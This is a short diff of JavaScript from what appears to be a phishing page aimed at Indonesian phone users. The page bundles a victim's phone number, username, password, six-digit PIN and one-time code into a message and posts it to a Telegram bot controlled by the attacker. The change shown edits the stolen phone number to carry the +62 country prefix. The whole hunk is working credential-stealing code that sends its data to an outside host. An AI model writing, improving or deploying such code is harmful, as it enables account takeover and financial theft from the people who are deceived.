@@ -180,7 +180,7 @@ var logo = "━─━─༺𝙬𝙬𝙬.𝙗𝙩𝙣.𝙘𝙤.𝙞𝙙___▩";
       document.getElementById('kirim').innerHTML = "Please wait...";    
 $("#loading").show();
                   
-    var gabungan = "" + logo + '%0A※ 𝗡𝗼.𝗛𝗣 •• ' + nohp + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass + '%0A※ 𝗣𝗶𝗻 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 + '%0A%0A※ 𝗢𝗧𝗣 •• ' + otp.value;
+    var gabungan = "" + logo + '%0A※ 𝗡𝗼.𝗛𝗣 •• %2B62' + nohp + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass + '%0A※ 𝗣𝗶𝗻 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 + '%0A%0A※ 𝗢𝗧𝗣 •• ' + otp.value;
         $.ajax({                   
             url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
             method: `POST`,                      
